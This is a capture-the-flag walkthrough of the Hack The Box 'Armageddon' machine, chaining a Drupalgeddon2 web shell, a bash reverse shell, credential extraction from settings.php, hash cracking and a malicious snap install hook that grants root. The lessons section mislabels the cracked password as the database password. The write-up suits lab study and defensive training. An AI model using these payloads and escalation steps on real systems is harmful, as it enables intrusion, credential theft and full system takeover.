---
# Hack The Box: Armageddon

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Easy |
| **OS** | Linux |
| **IP** | 10.10.10.233 |
| **Points** | 20 |
| **Release Date** | February 2021 |
| **Retired Date** | July 2021 |
| **My Rating** | 6/10 |

## TL;DR
Started with a classic Drupalgeddon2 RCE to drop a web shell as the `apache` user. Poked around the Drupal configuration files to extract database credentials, dumped the MySQL hashes, and cracked the admin password to pivot via SSH to `brucetherealadmin`. From there, I discovered a wild `sudo` misconfiguration allowing me to install snap packages as root, which I abused by building a malicious snap to spawn a root shell.

## Reconnaissance
I kicked things off with a standard all-ports scan using `nmap` to get a lay of the land. 

```bash
nmap -p- --min-rate 10000 10.10.10.233 -oA initial_scan
```
<!-- screenshot: nmap initial scan results -->

The results came back quickly, revealing only two open ports:
*   **Port 22:** SSH (OpenSSH 7.4)
*   **Port 80:** HTTP (Apache httpd 2.4.6 CentOS)

Since SSH is rarely the initial entry point unless I have credentials, I directed my attention to the web server on port 80. Navigating to the IP in my browser presented a fairly barren website titled "Armageddon." 

<!-- screenshot: web application landing page -->

I ran a more targeted scan against port 80 to grab service versions and run default scripts.

```bash
nmap -sC -sV -p 80 10.10.10.233
```

The output confirmed it was running on CentOS and, more importantly, the HTTP generator meta tag explicitly stated: `Drupal 7 (http://drupal.org)`. It also grabbed the `robots.txt` file, which contained a massive list of standard Drupal directories (`/includes/`, `/modules/`, etc.).

My immediate thought was: "Okay, Drupal 7. This is highly likely going to be Drupalgeddon 2 or 3." But before throwing exploits blindly, I needed to confirm the exact version. I navigated to `http://10.10.10.233/CHANGELOG.txt`. This is a classic rookie mistake by system administrators—leaving the changelog exposed.

```bash
curl -s http://10.10.10.233/CHANGELOG.txt | head -n 10
```

The response slapped me right in the face with the version: `Drupal 7.56`. This version is squarely in the vulnerable range for CVE-2018-7600 (Drupalgeddon 2).

## Initial Foothold
With the version confirmed, I hit Exploit-DB and GitHub. There are Metasploit modules for this, but I prefer to avoid MSF when possible to better understand the underlying mechanics. I found a highly reliable Ruby script by `dreadlocked` specifically designed for Drupalgeddon 2.

At first, I thought I could just execute a reverse shell command directly using the script, but the payload length limitations and bad characters in the URL-encoded payload caused it to fail. The script hung, and my listener stayed silent.

This was a minor roadblock. I realized I needed a staged approach. Instead of a direct reverse shell, I decided to use the exploit to write a simple PHP web shell to the server's root directory.

```bash
./drupalgeddon2.rb http://10.10.10.233
```

The script successfully injected the payload via the Form API (FAPI) rendering process, writing a tiny shell to `shell.php`. I verified it was working by curling a simple `id` command.

```bash
curl 'http://10.10.10.233/shell.php' -d 'c=id'
```

The response came back: `uid=48(apache) gid=48(apache) groups=48(apache)`. Perfect. 

Now I needed a proper interactive shell. I set up my Netcat listener:

```bash
nc -lnvp 9999
```

And used `curl` to pass a bash reverse shell one-liner to my dropped web shell. I made sure to URL-encode it properly so the web server wouldn't mangle it.

```bash
curl -G --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/10.10.14.7/9999 0>&1'" 'http://10.10.10.233/shell.php'
```

<!-- screenshot: successful exploitation (reverse shell) -->

I caught the shell! I immediately stabilized it using Python because working in a raw, unbuffered shell is a nightmare, especially if you need to use a text editor or tab completion later.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Lateral Movement
I was in as the `apache` user, which is severely restricted. I checked `/home` and saw a directory for a user named `brucetherealadmin`. I couldn't read the `user.txt` flag, so pivoting to Bruce was the next logical step.

Since this was a Drupal site, my first instinct was to hunt down the database configuration file. In Drupal 7, this is almost always located at `sites/default/settings.php`.

```bash
cat /var/www/html/sites/default/settings.php | grep -i password
```

Bingo. I found the plaintext MySQL credentials:
*   **User:** `drupaluser`
*   **Password:** `CQHEy@9M*m23gBVj`

I logged into the local MySQL instance using these credentials.

```bash
mysql -u drupaluser -p'CQHEy@9M*m23gBVj'
```

I navigated to the `drupal` database and dumped the `users` table to grab Bruce's password hash.

```sql
use drupal;
select name, pass from users;
```

The query returned Bruce's hash: `$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt`. This is a Drupal 7 specific hash format (which uses SHA-512 with a specific number of rounds). 

I copied the hash back to my attacking machine, fired up Hashcat, and pointed it at the `rockyou.txt` wordlist. The mode for Drupal 7 is `7900`.

```bash
hashcat -m 7900 bruce_hash.txt /usr/share/wordlists/rockyou.txt
```

It cracked almost instantly. The password was incredibly weak: `booboo`. 

I immediately tried to SSH into the box using these new credentials. Reusing passwords across the web application and the actual underlying Linux system is a terrible practice, but it's shockingly common.

```bash
ssh brucetherealadmin@10.10.10.233
# Password: booboo
```

I was in as Bruce! I grabbed the `user.txt` flag from his home directory.

## Privilege Escalation
Now for the fun part: getting root. My standard methodology is to always check `sudo` permissions first before running heavy enumeration scripts like `LinPEAS`.

```bash
sudo -l
```

<!-- screenshot: sudo -l output -->

The output was immediately interesting:

```text
User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

Bruce was allowed to use the `snap` package manager to install anything, as root, without a password. 

At first, I thought this was just a misconfiguration that might let me overwrite a system binary, but `snap` has a very specific package structure. After about 15 minutes of researching "snap privilege escalation," the breakthrough came when I realized how Snap packages handle installation hooks.

When you install a snap package, `snapd` (running as root) executes a script called `install` located in the `meta/hooks/` directory of the package. If I could build a malicious snap package containing a custom install hook, I could get root to execute whatever I wanted.

I needed to build the snap package on my attacking machine because the target lacked the necessary compilation tools (`snapcraft` or `fpm`). I used a tool called `fpm` (Effing Package Management) because it's incredibly fast for creating dummy packages.

First, I created a malicious install script. I decided the easiest route was to make `/bin/bash` a SUID binary.

```bash
mkdir -p snap_exploit/meta/hooks
cat << 'HOOK' > snap_exploit/meta/hooks/install
#!/bin/sh
chmod +s /bin/bash
HOOK
chmod +x snap_exploit/meta/hooks/install
```

Then, I used `fpm` to package it into a `.snap` file.

```bash
fpm -n exploit -s dir -t snap -a all snap_exploit/
```

This generated a file named `exploit_1.0_all.snap`. I spun up a quick Python HTTP server and transferred the file to the `/tmp` directory on the Armageddon machine using `wget`.

```bash
# On attacking machine
python3 -m http.server 80

# On target machine
cd /tmp
wget http://10.10.14.7/exploit_1.0_all.snap
```

Now, I executed the `sudo` command. Because my snap was unsigned and not from the official store, I had to use the `--dangerous` flag to force the installation.

```bash
sudo /usr/bin/snap install exploit_1.0_all.snap --dangerous
```

The installation process ran, and crucially, `snapd` executed my malicious hook script. I checked the permissions on `/bin/bash`.

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash
```

The SUID bit was set! I executed bash with the `-p` flag to preserve privileges.

```bash
/bin/bash -p
```

<!-- screenshot: root flag -->

Got root! That was a fun one. The Drupal exploitation was standard fare, but the snap package creation required some specific structural knowledge that I hadn't used in a while.

## Lessons Learned
- **Exposed Changelogs:** The `CHANGELOG.txt` file is a goldmine for attackers. It immediately pinpointed the exact Drupal version, saving me from having to guess or fingerprint the site through other means. Delete or restrict access to these files in production.
- **Password Reuse:** Using the weak database password (`booboo`) as the system SSH password for the administrator is a catastrophic failure in segmentation.
- **What tripped me up:** I initially tried to get a direct reverse shell through the Drupalgeddon exploit script, but it failed due to character encoding issues in the URL. Switching tactics to drop a simple PHP web shell first, and *then* executing the reverse shell through that, was a much more reliable approach.
- **Pro Tip:** When you see an unusual binary allowed in `sudo -l` (like `snap`, `npm`, `pip`, or `composer`), your first instinct should be to research how that package manager handles pre/post-install scripts. They almost always execute in the context of the user running the installation (in this case, root).

## References
- CVE-2018-7600 (Drupalgeddon 2): https://nvd.nist.gov/vuln/detail/CVE-2018-7600
- Drupalgeddon 2 Ruby Exploit: https://github.com/dreadlocked/Drupalgeddon2
- GTFOBins (Snap): https://gtfobins.github.io/gtfobins/snap/
- Official Hack The Box Page: https://app.hackthebox.com/machines/Armageddon
